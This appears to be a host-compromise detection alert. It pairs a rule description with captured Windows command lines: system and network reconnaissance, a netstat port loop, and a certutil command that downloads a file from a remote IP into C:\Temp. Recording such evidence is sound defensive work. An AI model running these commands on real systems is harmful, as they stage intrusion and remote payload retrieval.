anchor_rule.name: A2-主机沦陷-单主机高置信
anchor_rule.description: 沦陷(X) ⇒ emit 主机沦陷(X)。盲区主机被真沦陷战术打穿即成案, 不依赖横移连接。

processes.cmdline: cmd.exe /c \"ver & echo --- & systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"OS Architecture\" /C:\"Host Name\" 2>nul & echo ---NET--- & ipconfig /all 2>nul | findstr /I /C:\"IPv4\" /C:\"Gateway\" /C:\"Adapter\" /C:\"Description\"\"
cmd.exe /c \"for /l %i in (1,1,254) do @netstat -an | findstr \":%i.*LISTENING\" >nul 2>&1 & echo test\"
cmd.exe /c \"certutil -urlcache -split -f http://10.10.10.10:80/ C:\\Temp\\_c1.txt 2>&1 | findstr /i \"失败 成功\"\"
